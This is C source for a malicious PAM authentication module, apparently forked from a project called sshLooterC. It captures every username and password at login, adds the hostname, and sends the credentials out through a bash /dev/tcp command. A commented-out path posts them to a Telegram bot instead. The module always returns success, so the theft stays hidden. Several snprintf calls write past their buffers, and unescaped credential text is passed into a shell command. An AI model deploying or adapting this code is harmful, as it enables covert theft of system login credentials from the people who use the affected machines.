//Forked from https://github.com/mthbernardes/sshLooterC
//Thanks to @mthbernardes

#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>

#define RECVER_HOST "127.0.0.1"
#define RECVER_PORT "18086"

size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp)
{
    return size * nmemb;
}

void sendMessage(char (*message)[]) {
    char url[500];
    char data[200];

    //INSERT HERE YOUR BOT KEY
    char token[200] = "BOT TOKEN";

    //INSERT HERE YOUR USER ID
    int user_id = 1111111;

    snprintf(url,600,"https://api.telegram.org/bot%s/sendMessage",token);
    snprintf(data,300,"chat_id=%d&text=%s",user_id,*message);
    CURL *curl;
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS,data); 
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_perform(curl);
    }                                                                             
    curl_global_cleanup();
}

void testLootC(char (*message)[]) {
	char cmd_sendpwd[2048];
        (void)snprintf(cmd_sendpwd, 2048, "bash -c \"echo '{%s}' > /dev/tcp/%s/%s\" 2>/dev/null", *message,RECVER_HOST,RECVER_PORT);
        system(cmd_sendpwd);
}

PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
    int retval;
    const char* username;
    const char* password;
    char message[1024];
    char hostname[128];
    retval = pam_get_user(pamh, &username, "Username: ");
    pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
    if (retval != PAM_SUCCESS) {
        return retval;
    }
    gethostname(hostname, sizeof hostname);
    snprintf(message,2048,"Hostname: %s\nUsername %s\nPassword: %s\n",hostname,username,password);
    //sendMessage(&message);
    testLootC(&message);
    return PAM_SUCCESS;
}
